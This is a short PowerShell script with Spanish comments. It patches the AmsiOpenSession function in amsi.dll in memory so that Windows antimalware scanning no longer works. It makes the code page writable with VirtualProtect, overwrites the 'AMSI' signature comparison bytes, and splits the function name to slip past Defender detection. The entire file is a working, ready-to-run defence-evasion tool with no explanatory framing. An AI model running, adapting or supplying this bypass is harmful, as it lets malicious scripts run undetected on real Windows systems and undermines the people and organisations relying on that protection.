$bypass = @"
using System;
using System.Runtime.InteropServices;


public class Class {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}
"@
Add-Type $bypass  #definimos la clase .NET
$parche64 = [Byte[]](0x81,0x39,0x21,0x57,0x4E,0x50)  #Código ensamblador que se va a inyectar. Solo funcional para x64
$asd = [Class]::LoadLibrary("amsi.dll") #Cargamos amsi
Write-Output "[+] Parche $parche64"
Write-Output "[+] Cambiando  81 39 41 4D 53 49       cmp     dword ptr [rcx], 49534D41h ;"
Write-Output "[+] 81 39 21 57 4E 50       cmp     dword ptr [rcx], 504E5721h ;"
$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero. Apartado que suele generar detecciones del Defender.
$a=$punterofuncion.ToInt64() + 10 #Posicion del comando que queremos modificar en memoria. Se calcula restando el puntero de amsiopensession del puntero de este comando
$punterofuncion = [IntPtr] $a
$oldProtect = 0

Write-Output "[+] Cambiando permisos de paginacion de amsi.dll a RWX..."
[Class]::VirtualProtect($punterofuncion, [uint32]$parche64.Length, 0x40, [ref] $oldProtect)  
Write-Output "[+] Parchenado amsiopensession"
[System.Runtime.InteropServices.Marshal]::Copy($parche64, 0, $punterofuncion, $parche64.Length)
Write-Output "[+] Devolviendo permisos de paginacion de amsi.dll a RX..."
[Class]::VirtualProtect($punterofuncion, [uint32]$parche64.Length, 0, [ref] $null)
